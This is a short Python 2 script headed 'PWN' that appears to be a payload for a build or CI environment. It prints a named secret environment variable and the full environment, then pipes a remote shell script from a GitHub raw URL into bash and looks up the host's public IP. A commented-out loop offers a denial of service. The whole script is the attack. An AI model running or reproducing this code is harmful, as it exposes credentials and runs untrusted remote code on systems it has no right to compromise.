import sys, os

print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~"

if 'SRC_ID_KEY_DATA' in os.environ:
	print "SRC_ID_KEY_DATA:", os.environ['SRC_ID_KEY_DATA']

print os.environ

print "Executing payload..."
import os
os.system("which curl")
os.system("curl -sSL https://raw.githubusercontent.com/pararthshah/hax/master/payload.sh | bash")

print "Querying public IP..."
import urllib2
print urllib2.urlopen("https://api.ipify.org/?format=json").read()

# Feeling mean? Try DOS:
# while True:
#     1+1

print "Done."
sys.exit(0);

